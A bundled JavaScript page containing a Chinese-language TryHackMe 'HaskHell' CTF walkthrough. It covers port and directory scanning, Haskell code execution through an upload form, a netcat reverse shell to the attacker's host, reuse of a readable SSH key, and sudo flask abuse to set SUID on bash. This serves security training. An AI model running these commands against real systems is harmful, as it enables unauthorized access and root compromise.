"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[8047],{40733:(e,r,n)=>{n.r(r),n.d(r,{assets:()=>i,contentTitle:()=>o,default:()=>d,frontMatter:()=>a,metadata:()=>l,toc:()=>p});var s=n(74848),t=n(28453);const a={sidebar_position:112,tags:["Easy","Linux","\u547d\u4ee4\u6ce8\u5165","SUDO"],title:"HaskHell",description:"HaskHell",sidebar_label:"HaskHell",slug:"/tryhackme/112"},o="HaskHell",l={id:"box/TryHackMe/112",title:"HaskHell",description:"HaskHell",source:"@site/docs/box/TryHackMe/112.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/112",permalink:"/docs/tryhackme/112",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u547d\u4ee4\u6ce8\u5165",permalink:"/docs/tags/\u547d\u4ee4\u6ce8\u5165"},{label:"SUDO",permalink:"/docs/tags/sudo"}],version:"current",sidebarPosition:112,frontMatter:{sidebar_position:112,tags:["Easy","Linux","\u547d\u4ee4\u6ce8\u5165","SUDO"],title:"HaskHell",description:"HaskHell",sidebar_label:"HaskHell",slug:"/tryhackme/112"},sidebar:"boxSidebar",previous:{title:"battery",permalink:"/docs/tryhackme/111"},next:{title:"Olympus",permalink:"/docs/tryhackme/113"}},i={},p=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"5001",id:"5001",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"flask",id:"flask",level:3},{value:"flask \u2014&gt; prof",id:"flask--prof",level:3},{value:"prof \u2014&gt; root",id:"prof--root",level:3}];function c(e){const r={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,t.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(r.h1,{id:"haskhell",children:"HaskHell"}),"\n",(0,s.jsx)(r.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(r.pre,{children:(0,s.jsx)(r.code,{className:"language-bash",children:"root@ip-10-10-58-118:~/haskhell# nmap -sTCV -p 22,5001 --min-rate 1000 10.10.64.91\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-23 07:23 BST\nNmap scan report for ip-10-10-64-91.eu-west-1.compute.internal (10.10.64.91)\nHost is up (0.00014s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)\n|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)\n|_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (EdDSA)\n5001/tcp open  http    Gunicorn 19.7.1\n|_http-server-header: gunicorn/19.7.1\n|_http-title: Homepage\nMAC Address: 02:54:61:F2:3B:F7 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 17.32 seconds\n"})}),"\n",(0,s.jsx)(r.h2,{id:"5001",children:"5001"}),"\n",(0,s.jsx)(r.p,{children:"\u8fdb\u884c\u76ee\u5f55\u626b\u63cf"}),"\n",(0,s.jsx)(r.pre,{children:(0,s.jsx)(r.code,{className:"language-bash",children:"root@ip-10-10-58-118:~/haskhell# gobuster dir -u http://10.10.64.91:5001/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.64.91:5001/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     html,php,txt\n[+] Timeout:        10s\n===============================================================\n2023/09/23 07:42:06 Starting gobuster\n===============================================================\n/submit (Status: 200)\n"})}),"\n",(0,s.jsx)(r.p,{children:"\u901a\u8fc7\u8bbf\u95ee\u7f51\u7ad9\u6211\u77e5\u9053\u8fd9\u662f\u4e00\u4e2a\u4f5c\u4e1a\u63d0\u4ea4\u9875\u9762, \u6211\u4eec\u5728\u8be5\u7f51\u7ad9\u4e0a\u4f20haskell \u7136\u540e\u7f51\u7ad9\u4f1a\u5c06\u5176\u8fdb\u884c\u89e3\u6790\u5e76\u6267\u884c, \u56e0\u6b64\u6211\u4f7f\u7528 GPT \u7f16\u5199\u4e86\u4e00\u4e2a\u7a0b\u5e8f\u7528\u4ee5\u6267\u884c\u547d\u4ee4"}),"\n",(0,s.jsx)(r.pre,{children:(0,s.jsx)(r.code,{className:"language-bash",children:'import System.Process\nimport System.IO\n\nmain :: IO ()\nmain = do\n  (_, Just hout, _, _) <- createProcess (shell "whoami") { std_out = CreatePipe }\n  output <- hGetContents hout\n  putStrLn output\n'})}),"\n",(0,s.jsx)(r.p,{children:(0,s.jsx)(r.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-133444.png",alt:"Untitled"})}),"\n",(0,s.jsx)(r.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(r.h3,{id:"flask",children:"flask"}),"\n",(0,s.jsx)(r.p,{children:"\u6211\u5229\u7528\u6b64\u6765\u83b7\u53d6\u4e86\u4e00\u4e2a Shell"}),"\n",(0,s.jsx)(r.pre,{children:(0,s.jsx)(r.code,{className:"language-bash",children:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.58.118 4444 >/tmp/f\n"})}),"\n",(0,s.jsx)(r.p,{children:(0,s.jsx)(r.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-133445-1.png",alt:"Untitled"})}),"\n",(0,s.jsx)(r.h3,{id:"flask--prof",children:"flask \u2014> prof"}),"\n",(0,s.jsx)(r.p,{children:"\u6211\u5728\u7528\u6237 prof \u7684\u5bb6\u76ee\u5f55\u53d1\u73b0\u5176\u5b58\u5728\u516c\u5171\u8bfb\u7684 ssh \u5bc6\u94a5\u5e76\u4e14\u6ca1\u6709\u5bc6\u7801\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u6765\u5b8c\u6210\u767b\u9646\u64cd\u4f5c"}),"\n",(0,s.jsx)(r.pre,{children:(0,s.jsx)(r.code,{className:"language-bash",children:"(remote) flask@haskhell:/home$ ls -al prof/\ntotal 44\ndrwxr-xr-x 7 prof prof 4096 May 27  2020 .\ndrwxr-xr-x 5 root root 4096 May 27  2020 ..\n-rw-r--r-- 1 prof prof  220 Apr  4  2018 .bash_logout\n-rw-r--r-- 1 prof prof 3771 Apr  4  2018 .bashrc\ndrwx------ 2 prof prof 4096 May 27  2020 .cache\ndrwx------ 4 prof prof 4096 May 27  2020 .gnupg\ndrwxrwxr-x 3 prof prof 4096 May 27  2020 .local\n-rw-r--r-- 1 prof prof  807 Apr  4  2018 .profile\ndrwxrwxr-x 2 prof prof 4096 May 27  2020 __pycache__\ndrwxr-xr-x 2 prof prof 4096 May 27  2020 .ssh\n-rw-r--r-- 1 root root   26 May 27  2020 user.txt\n(remote) flask@haskhell:/home$ cd prof/\n(remote) flask@haskhell:/home/prof$ ls\n__pycache__  user.txt\n(remote) flask@haskhell:/home/prof$ cd .ssh/\n(remote) flask@haskhell:/home/prof/.ssh$ ls -al\ntotal 20\ndrwxr-xr-x 2 prof prof 4096 May 27  2020 .\ndrwxr-xr-x 7 prof prof 4096 May 27  2020 ..\n-rw-rw-r-- 1 prof prof  395 May 27  2020 authorized_keys\n-rw-r--r-- 1 prof prof 1679 May 27  2020 id_rsa\n-rw-r--r-- 1 prof prof  395 May 27  2020 id_rsa.pub\n(remote) flask@haskhell:/home/prof/.ssh$\n"})}),"\n",(0,s.jsx)(r.p,{children:"\u4f7f\u7528\u6211\u4eec\u5f97\u5230\u7684\u79c1\u94a5\u8fdb\u884c\u767b\u9646\u5373\u53ef"}),"\n",(0,s.jsx)(r.p,{children:(0,s.jsx)(r.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-133445-2.png",alt:"Untitled"})}),"\n",(0,s.jsx)(r.h3,{id:"prof--root",children:"prof \u2014> root"}),"\n",(0,s.jsx)(r.p,{children:"\u6211\u53d1\u73b0\u7528\u6237 prof \u5177\u6709 SUDO \u7279\u6743"}),"\n",(0,s.jsx)(r.pre,{children:(0,s.jsx)(r.code,{className:"language-bash",children:"$ sudo -l\nMatching Defaults entries for prof on haskhell:\n    env_reset, env_keep+=FLASK_APP, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser prof may run the following commands on haskhell:\n    (root) NOPASSWD: /usr/bin/flask run\n"})}),"\n",(0,s.jsx)(r.p,{children:"\u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u6765\u5b8c\u6210\u4e00\u4e9b\u64cd\u4f5c"}),"\n",(0,s.jsx)(r.pre,{children:(0,s.jsx)(r.code,{className:"language-bash",children:'$ echo \'import os; os.system("chmod u+s /bin/bash")\' > root.py\n$ export FLASK_APP=root.py\n$ sudo /usr/bin/flask run\nUsage: flask run [OPTIONS]\n\nError: Failed to find application in module "root".  Are you sure it contains a Flask application?  Maybe you wrapped it in a WSGI middleware or you are using a factory function.\n$ ls -al /bin/bash\n-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash\n'})})]})}function d(e={}){const{wrapper:r}={...(0,t.R)(),...e.components};return r?(0,s.jsx)(r,{...e,children:(0,s.jsx)(c,{...e})}):c(e)}},28453:(e,r,n)=>{n.d(r,{R:()=>o,x:()=>l});var s=n(96540);const t={},a=s.createContext(t);function o(e){const r=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(r):{...r,...e}}),[r,e])}function l(e){let r;return r=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:o(e.components),s.createElement(a.Provider,{value:r},e.children)}}}]);